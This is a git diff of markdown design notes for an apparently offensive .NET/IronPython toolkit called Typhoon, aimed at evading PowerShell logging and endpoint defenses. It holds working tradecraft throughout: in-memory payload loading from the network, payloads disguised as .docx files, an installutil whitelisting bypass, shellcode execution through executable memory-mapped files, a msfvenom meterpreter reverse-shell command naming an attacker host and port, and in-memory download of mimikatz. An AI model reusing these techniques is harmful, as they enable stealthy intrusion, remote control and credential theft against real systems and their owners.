@@ -1,40 +1,39 @@
 
 
-# TODO 
-```
-Methods:
-- Alt Streams delivery
-- csc compilation to AppTemp
-- app.exe.config download of content to Temp/dl3
-- loading python stdlib from PKzip (docx)
-- loading .net modules
-- memory mapped registry of source compile (py and cs)
-- python exploit scripts compat (msf payloads)
-- loading and executing exes from memory (mimikatz)
-- side loading pip packages in zips. 
-- Win32 API call proxy (.cs or .py)
 
+## Goals. What are we solving
 
-top
-	python
-		stdlib load file <file> 
-		stdlib load url <url> <localfile>
-		module load url <url> <mmap|file>
-		module load <file>
-		exec module <name>
-		repl <mode>
+- Ability to recon under the radar for longer (primary)
+- Ability to better deliver code and payloads over .Net facilities across monitored systems and networks
+- Ability to quickly retool. Building blocks vs. fingerprintable products.
 
-	dotnet
-		assembly load file <file>
-		assembly load url <url> <file>
+###  Managed  (compiled) - CSaw
+- Ability to dynamically compile CSharp code
+- Ability to load assemblies in memory and  removing disk artifacts
+- Ability to compile and run in separate invocations
+- Ability to dynamically load an assembly and invoke and class in it
+- Ability to REPL CSharp for quick gains 
+- Ability to use CSharp to avoid PS monitoring
+- Ability to increase effectiveness of payload delivery over managed code (a bonus)
+- AppDomain assist
+- Interop to native unmanaged
 
-		module load url <url>
-		module compile file <file> <name>
-		module compile file <file>
+### Managed (dynamic) - DLRium
 
-```
-
+- Ability to leverage DLR to avoid Powershell logging while preserving scriptability (in cmparison to CS)
+- Ability to leverage Python expressiveness and dynamic typing while still having ability to transparently engage .Net framework mechanisms
+- Ability to compile Python to exe or dll via DLR
+- Ability to drop down to .Net from Python or to Python from .Net (stealth, confusing analysis)
+- Load from Bytes
+- Interop to native unmanaged with load/unload
             
+## Challenges. Technical and DFIR
+- What artifacts does dynamic compilation produce. How can we minimize it.
+- What facilities in .Net are available to increase stealth of both payload delivery and recon
+- PyDLR != CPython
+    - Stdlib modules minus (c, size, format). Size, format -> zip loading
+    -  
+
 ## Example: Invoking Iron Python from IronPython over .Net Assembly w/variables (-> stealth)
 ```python
 import clr
@@ -58,7 +57,9 @@ source.Execute(mod)
 ```
 
 
-## CSX Example: List available managed compliers on the system
+## CSaw: List available managed compliers on the system (CSX format)
+We would like to introduce a way to quickly REPL/prototype code 
+
 ```csharp
 directive> using System;
 directive> using System.IO;
@@ -86,9 +87,9 @@ directive>
 ```
 
 
-# Load over newtwork
+## Delivery: Load PY over network, from CS code
+Example: Direct PYDLR invoke
 
-Exmaple: Direct PYDLR invoke
 ```csharp
 
 WebClient wc = new WebClient();
@@ -119,7 +120,9 @@ foreach (ZipArchiveEntry entry in archive.Entries)
 
 ```
 
-Example: Stage code in memory mapped file (.e.g further compilation)
+## Stage code in memory mapped file (e.g. for further compilation)
+- We save in memory resident store 
+- We do not store on disk. Some defenses miss that. Some will flag. We can decouple payload storage and invocation on demand.
 
 ```csharp
 Dictionary<String, MemoryMappedFile> mmfRepo = new Dictionary<String, MemoryMappedFile>();
@@ -159,25 +162,23 @@ foreach (ZipArchiveEntry entry in dllarchive.Entries)
  
 ### Methods of bringing assemblies across inspected network:
 
-1. Compile `.cs` code and have DLLs as embedded resources 
+1. Compile `.cs` code and have DLLs as embedded resources in your assemblies
 `/csc /resource:Ironpython.dll`
 
-2. Bring netmodules across inspected lines 
+2. Bring modularized assemblies as netmodules. A Netmodule is an assembly without a manifest. Not identifiable or scannable as not executable. Complie to a product onsite.
 
 `csc -target:module payload.cs `
 `csc /netmodule:module`
 
 Also, see Examples\ComplileNetMod.py
-3. Possibly used .Net Download Cache 
-
+3. Possibly use .Net Download Cache facilities
 
 `gacutul /ldl`
 
 (Location where it downloads):
  C:\Users\dimas\AppData\Local\assembly\dl3\
 
-
-You can modify. `yourexe.exe.config` file and point to remote DDL to fetch. 
+You can modify. `yourexe.exe.config` file and point to remote DLL to fetch. 
 
 Example:
 
@@ -201,12 +202,15 @@ Example:
 </configuration>
 ```
 
+## DLRium: Example: compile netmodules in code, and then assemble them, in code
 
+C:\Users\dimas\Documents\Projects\MET\Typhoon\Examples\Netmodules\CompileNetMod.py
 
+## Attempt Logging evasion while maintaining productivity 
 
-# Logging evasion while maintaining productivity 
+choices:
 
-## cPython: Not logged but you need cPython on target machine (blacklisted)
+- cPython: Not logged but you need cPython on target machine (blacklisted)
 
 ```python
 import urllib2
@@ -214,8 +218,7 @@ content = urllib2.urlopen("http://google.com").read()
 print(content)
 ```
 
-## C#: Not logged, requires invocation of csc.exe from potentially logged shell
-
+- CSharp: Not logged, but a direct compilation requires invocation of `csc.exe` executable from potentially logged shell. Powershell records you executing `csc.exe` or `msbuild.exe`.
 
 ```csharp
 using System.Net
@@ -227,7 +230,7 @@ using (var webClient = new WebClient())
 }
 ```
 
-## Powershell 5: Logged 
+- Powershell 5: Logged 
 
 ```powershell
 $webClient = New-Object System.Net.WebClient
@@ -235,14 +238,17 @@ $content = $webClient.DownloadString("http://google.com")
 Out-Host $content 
 ```
 
-## Options: 
-1) Dymamic CS compil
-2) DLR
+### Options: 
+1) Dymamic CS compilation and invocation
 
-## Python DLR. Not logged, dynamic, some batteries included. as long as you can run an unsigned executable or 
-installutil: `%windir%\Microsoft.NET\Framework\v2.0.50727\installutil /logtoconsole=false /logfile= /u [your assembly .dll here]`
+Not logged, full .Net, as long as you can run an unsigned executable or invoke with already whitelisted: installutil: `%windir%\Microsoft.NET\Framework\v2.0.50727\installutil /logtoconsole=false /logfile= /u [your assembly .dll here]`
 
-##  CSX script
+2) Invocation via  DLR
+Python DLR. Not logged, dynamic, some batteries included. ^^ rules apply
+
+##  CSaw: CSX script
+- Some contract to code. Rudmintary (no classes no functions), fast and dirty prototype. Recon. (We will do better with extensions later).
+
 ```csharp 
 using System; 
 using System.Net;
@@ -254,19 +260,23 @@ Console.WriteLine("{0} ... ", reply.Substring(0, 80));
 END
 ```
 
-## PYDLR csript
+## DLRium PyDLR script
+- Full Python flow and branching, as long as you stay sequential.
+
 ```python
 from System.Net import WebClient
 content = WebClient().DownloadString("http://google.com")
 print content
 ```
 
-Evasion with productivity. .Net DLR + Python vs. Powershell
+## Evasion with productivity. .Net DLR + Python from CSharp
 
 
-## IPY introspection via reflection. Even more stelth
+### PyDLR introspection via reflection. Even more stealth?
 
-`TestClass.py`
+1. Python file which contains what we want to execute: `TestClass.py`
+Trivial example of adding two numbers
+
 ```python 
 # The class you want to access externally.
 class DoCalculations():
@@ -286,7 +296,10 @@ def __test__():
  print MyCalc.DoAdd(5, 10)
 ```
 
-Normal IronPython invoke:
+2. Invoke PyDLR class from CSharp 
+
+a. Normal invoke. 
+
 ```csharp 
 // Obtain the runtime.
 var IPY = Python.CreateRuntime();
@@ -296,7 +309,7 @@ dynamic TestPy = IPY.UseFile(“TestClass.py”);
 TestPy.__test__();
 ```
 
-Reflective IronPython Invoke
+b. Reflective IronPython Invoke
 ```csharp
 // Introspect iPython module:
 // Create an object for performing tasks with the script.
@@ -314,18 +327,22 @@ Int32 Result = (Int32)Ops.Invoke(AddMe, 5, 10);
 ```
 
 
-## Python without STDLib 
->>> print sys.builtin_module_names
+## IronPython without STDLib included
+```>>> print sys.builtin_module_names
 ('unicodedata', '_ast', 'imp', 'future_builtins', 'clr', 'exceptions', '__builtin__', 'sys', 'array', 'binascii', 'bz2', 'cmath', 'msvcrt', 'mmap', 'signal', 'winsound', 'zipimport', 'zlib', '_bisect', '_codecs', '_collections', 'copy_reg', 'cPickle', 'cStringIO', 'datetime', 'errno', 'gc', 'itertools', '_csv', '_io', '_locale', 'marshal', 'math', '_md5', 'nt', 'operator', 're', 'select', '_sha', '_sha256', '_sha512',/ 'socket', '_ctypes', '_ctypes_test', '_heapq', '_struct', 'thread', 'time', 'xxsubtype', '_functools', '_random', '_sre', '_ssl', '_subprocess', '_warnings', '_weakref', '_winreg')
+```
 
 
-
-## load Ironpython Stdlib from zip. Zip can also be brought in as `docx`
+## Load Ironpython Stdlib from zip. Zip can also be brought in as renamed `docx`
 ```python
 sys.path.append(r"C:\Users\dimas\Downloads\dist\StdLib.docx")
 ```
-Benefits of StdLib you get a lot more `python` modules. Example:
+
+- Benefits of StdLib you get a lot more `python` modules. Example:
 `import traceback, os`
+- Size increases.
+- On-disk drop.
+- Much available from .Net but can mix and match to confuse defenses more 
 
 ```python
 import clr, sys
@@ -341,14 +358,13 @@ except Exception as e:
 END
 ```
 
-# Assemblies not need to be named DDL (.NEt loader does not care about name, only embeded manifest)
+# Note on Assemblies: .Net does not require them to be named DLL (.NEt loader does not care about name, only embeded manifest)
 import clr
 clr.AddReferenceToFileAndPath(r"C:\\Users\\dimas\\AppData\\Local\\Temp\tmp14A5.tmp")
 
 
 
-
-### Win Forms
+### .Net is .Net . DLR is a .Net technique. Can expand easily into Win Forms, etc.
 
 ```python 
 import clr; 
@@ -376,13 +392,15 @@ f()
 ```
 
 
-## Compile PyDLR into dll
+## Compile PyDLR into dll and load it
 
-test.py:
+File: `test.py`:
 ```python
 def hello():
     print "Hello"
 ```
+
+Compile and load:
 
 ```python
 import clr
@@ -392,17 +410,23 @@ import test
 print test.hello()
 ```
 
-## Python DLR to Exe
+## Compile PyDLR to Exe.
+- In fact, compile ron pyton interpreter to exe via reflection:
+
 ```batch
 .\Typhoon.exe  -mode=exec -type=py -method=sfile -resource=..\..\Examples\Extensions\Pyc.py -targs="/target:exe /platform:x64 /main:test_main.py test_main.py" 
+```
 
+Run time dependencies still need to be accounted for. Depends how you look at it. Standalone payload functionality wtih dependent runtime libraries, vs. frozen fat binaries.
+
+```batch
 copy ..\..\Resources\IronPython.dll .
 copy ..\..\Resources\Microsoft.Dynamic.dll .
 copy ..\..\Resources\Microsoft.Scripting.dll .
 ```
 
+## Multiline PyDLR REPL is possible. Even easier than CSSharp:
 
-## Multiline Pyrepl
 ```python 
 import clr
 clr.AddReference("System.Windows.Forms")
@@ -411,8 +435,9 @@ MessageBox.Show("Hello World")
 END
 ```
 
-## Interop
-
+# Interop Section
+- Interop is interface with Native unmanaged code.
+- what .Net cannot do unamanged can
 
 ## CSharp via DLLImport
 ```csharp
@@ -439,9 +464,13 @@ ctypes.windll.kernel32.GetWindowsDirectoryA(buffer, len(buffer))
 print buffer.value
 ```
 
-See Examples\NCtypes.py
+See Examples\NCtypes.py for more 
+
 
 ## Dynamic WinaPi invoke cs script with shim assist
+- Abstracts complexity 
+- Does not lock resources. (.Net 2.x-4.x does not allow  unloading assemblies, unless in appdoamin (CSaw does it)  / DLium does it too)
+- .Net load via bytes? PyDLR can Note: .Net Core is not tested. 
 
 ```csharp
 using System; 
@@ -453,7 +482,16 @@ END
 ```
 
 
-## SEE Capture_via_compile 
+## See Capture_via_compile for full example of interop
+
+
+## Shellcode
+Options:
+ - void pointer to memory mapped file 
+ - via virtualalloc 
+
+
+a. via PyDLR
 ```python
 try:
     import socket
@@ -482,18 +520,66 @@ def scode():
   sock.close()
 
 scode()
-
-
 ```
 
-## If you want powerhell you could do:
+b. via CSharp
+
+see C:\Users\dimas\Documents\Projects\MET\Typhoon\Examples\ShellCode.cs
+
+```csharp
+ mmf = MemoryMappedFile.CreateNew("__shellcode",
+                            shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);
+
+// Create a memory mapped view accessor with read/write/execute permissions..
+mmva = mmf.CreateViewAccessor(0, shellcode.Length,
+            MemoryMappedFileAccess.ReadWriteExecute);
+
+// Write the shellcode to the MMF..
+mmva.WriteArray(0, shellcode, 0, shellcode.Length);
+
+// Obtain a pointer to our MMF..
+var pointer = (byte*)0;
+mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);
+
+// Create a function delegate to the shellcode in our MMF..
+var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer),
+                            typeof(GetPebDelegate));
+
+// Invoke the shellcode..
+return func();
+```
+
+```csharp
+                private WorkThreadFunction(ShellCode){
+                    DynCSharpRunner.CompileRunShellCode(ShellCode);
+                }
+               //msfvenom  -p windows/meterpreter/reverse_tcp --platform windows ReverseConnectRetries=255   
+                            PrependMigrate=true  LHOST=172.16.56.230 LPORT=1337 -e x86/shikata_ga_nai -i 3 -f  csharp 
+                String ShellCode = @"
+                    0xdb,0xc0,0xb8,0x22,0x07,0x27,0xf3,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,
+                    0x61,0x31,0x46,0x1a,0x83,0xc6,0x04,0x03,0x46,0x16,0xe2,0xd7,0xba,0x1c,0x88,
+                    0xb0,0x69,0xed,0x38,0xfb,0x8e,0x25,0x5a,0x04 ....
+                    ";
+
+
+                Thread thread = new Thread(new ThreadStart(WorkThreadFunction));
+                thread.IsBackground = true;
+                thread.Start();
+```
+
+
+## If you want powershell interface you could do:
 ```python 
+
+# Process start 
 try:
     from System.Diagnostics import Process
-    #Process.Start('powershell.exe', '')
+    # As an option
+    Process.Start('powershell.exe', '')
 except Exception as e:
     traceback.print_exc(file=sys.stdout)
 
+# More controlled invocation
 p = Process()
 p.StartInfo.UseShellExecute = False
 p.StartInfo.RedirectStandardOutput = True
@@ -504,8 +590,8 @@ p.WaitForExit()
 ```
 
 
+## Develop with  PyDLR: Casting, Typing, Lambdas, etc
 
-## Example PYDLR: Casting, Typing, Lambdas 
 ```python
 from System.Collections.Generic import IEnumerable, List
 list = List[int]([1, 2, 3])
@@ -520,20 +606,84 @@ Enumerable.Any[int](list, lambda x : x < 2)
 
 ## Download of file over TLS, Unzip into memory
 
-zip=wc.DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180322/mimikatz_trunk.zip")
+```
+zip=wc.DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/3.1.1-20180322/mimikatz_trunk.zip")
 zipdata = MemoryStream(zip)
 
 archive = ZipArchive(zipdata, ZipArchiveMode.Read)
 print(archive)
 <System.IO.Compression.ZipArchive object at 0x000000000000002B [System.IO.Compression.ZipArchive]>
+```
+
+## CSaw: Extensions.
+- Dynamic class building with disposable interface
+- Contract:
+
+```csharp
+        public void PreLaunch() {}
+        public void RunCode(){}
+        public void PostLaunch() {}
+```
 
 
+## NEED:
+- reflection/emit examples:
+  WmiQuery.cs
+  Pyc.py
 
-TODO: https://github.com/IronLanguages/dlr/releases
+- CodeDom
+- csc compilation (DFIR perspective):
 
+  ```csharp
+                // In-memory generation is a misnomer. There are some artifacts left on disk, 
+                // in-memory really means `in temp`
+                // Example of artifacts for in-memory compilation and preservation of temp files:
+                /*
+                 * λ dir "C:\Users\dimas\AppData\Local\Temp\tmp*"
+                     Volume in drive C has no label.
+                     Volume Serial Number is ECBC-2429
 
-TODO: C:\Users\dimas\Downloads\IronPython-2.7.7-win\IronPython-2.7.7\Platforms
+                    Directory of C:\Users\dimas\AppData\Local\Temp
 
+                    08/12/2017  10:31 PM                 0 tmp16A6.tmp
+                    08/12/2017  10:30 PM                 0 tmpF581.tmp
+                    08/12/2017  10:32 PM             2,080 1vvp5flt.0.cs
+
+                    If temp files are preserved we see:
+                    08/12/2017  10:32 PM               778 1vvp5flt.cmdline
+                    08/12/2017  10:32 PM                 0 1vvp5flt.err
+                    08/12/2017  10:32 PM             1,353 1vvp5flt.out
+                    08/12/2017  10:32 PM                 0 1vvp5flt.tmp
+                */
+                parameters.GenerateInMemory = true
+  ``` 
+  ```csharp
+                // options for the compiler. We choose `unsafe` because we want a raw pointer to the buffer containing shellcode
+                // parameters.CompilerOptions += "/optimize+ ";
+                // parameters.CompilerOptions += "/target:module"; 
+                parameters.CompilerOptions += "/nologo /unsafe"
+  ```
+  ```csharp
+                // This call to .CompiledAssembly loads the newly compile assembly into memory. 
+                // Now we can release locks on the assembly file, and delete it after we get the type to run
+                // Deletion of the assembly file is possible because we are executing in a new AppDomain. 
+                // Normally we cannot delete an asembly if it's being used/loadded in the same AppDomain. It is locked by the process.
+                var type = cr.CompiledAssembly.GetType("DynamicShellCode.DynamicShellCodeCompile")
+  ```
+# TODO 
+check releases 3.6, core https://github.com/IronLanguages/dlr/releases
+and platforms C:\Users\dimas\Downloads\IronPython-2.7.7-win\IronPython-2.7.7\Platforms
+
+Methods:
+- Alt Streams delivery
+- csc compilation to AppTemp
+- app.exe.config download of content to Temp/dl3
+- loading python stdlib from PKzip (docx)
+- loading .net modules
+- memory mapped registry of source compile (py and cs)
+- python exploit scripts compat (msf payloads)
+- loading and executing exes from memory (mimikatz)
+- side loading pip packages in zips. 
+- Win32 API call proxy (.cs or .py)
 0. Add resourced in resource editor
-1. Buidl actio: Embeedded resource
-
+1. Build action: Embeedded resource
